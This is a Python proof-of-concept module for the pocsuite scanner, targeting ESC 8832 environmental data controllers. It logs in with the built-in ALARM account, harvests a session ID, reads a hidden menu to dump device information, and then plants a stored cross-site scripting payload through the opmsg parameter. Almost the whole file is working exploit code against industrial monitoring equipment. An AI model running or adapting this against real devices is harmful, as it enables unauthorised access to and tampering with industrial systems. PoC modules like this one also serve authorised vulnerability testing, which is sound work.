#!/usr/bin/env python
# -*- coding:utf-8 -*-

import re,hashlib

from pocsuite.lib.utils.funs import randomStr
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register

class ESC_Data_Controller_Privilege_Escalation(POCBase):
    vulID = 'null'
    version = 'ESC 8832'
    vulDate = '2016-05-26'
    author = 'anonymous'
    references = ['null']
    name = 'Environmental Systems Corporation Data Controller'
    appPowerLink = 'http://www.envirosys.com/'
    appName = 'Environmental Systems Corporation Data Controllers'
    appVersion = 'firmware version 3.02 and earlier'
    vulType = 'Privilege Escalation & Cross Site Scripting'
    desc = 'The device supports different accounts with distribution of system privileges. An attacker can gain access to functions, which are not displayed in the menu for the user by means of brute force of a parameter.'


    def common(self):
        payload = 'formid=1&login=ALARM'
        response = req.post(self.url + "/escform.esp" , data = payload).content
        sessionid = re.search('<FRAME src="escmenu\.esp\?sessionid=(\d*)' , response)
        if sessionid:
            sessionid = sessionid.group(1)
        return sessionid

    def _verify(self, verify=True):
        result = {}
        sessionid = self.common()
        if sessionid:
            response = req.get(self.url + "/escmenu.esp?sessionid=" + sessionid + "&menuid=268").content
            title = re.search("<TH align=left>(ESC \d+ [\s\S]+?)</TH>" , response).group(1)
            contents = re.findall("<TH align=left>([a-zA-Z ]+?)</TH><TD>([\s\S]+?)</TD>" , response)
            counter = len(contents)

            print title , '\n'
            for tmp_counter in range(counter):
                print contents[tmp_counter][0] , ':' , contents[tmp_counter][1]

            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            response = req.get(self.url + "/escmenu.esp?sessionid=" + sessionid + "&menuid=11").content    #ÍË³öµÇÂ¼
        return self.parse_result(result)

    def _attack(self):
        result = {}
        sessionid = self.common()
        if sessionid:
            token = hashlib.new('md5', randomStr()).hexdigest()
            payload = '<script>alert("%s")</script>' % token
            req.get(self.url + "/escform.esp?sessionid=" + sessionid + "&formid=131&opmsg=" + payload).content
            response = req.get(self.url + "/escmenu.esp?sessionid=" + sessionid + "&menuid=257").content

            if token in response:
                result['VerifyInfo'] = {}
                result['XSSInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['XSSInfo']['Payload'] = payload
                response = req.get(self.url + "/escmenu.esp?sessionid=" + sessionid + "&menuid=259").content    #É¾³ýÏûÏ¢
                response = req.get(self.url + "/escmenu.esp?sessionid=" + sessionid + "&menuid=11").content     #ÍË³öµÇÂ¼
        return self.parse_result(result)


    def parse_result(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(ESC_Data_Controller_Privilege_Escalation)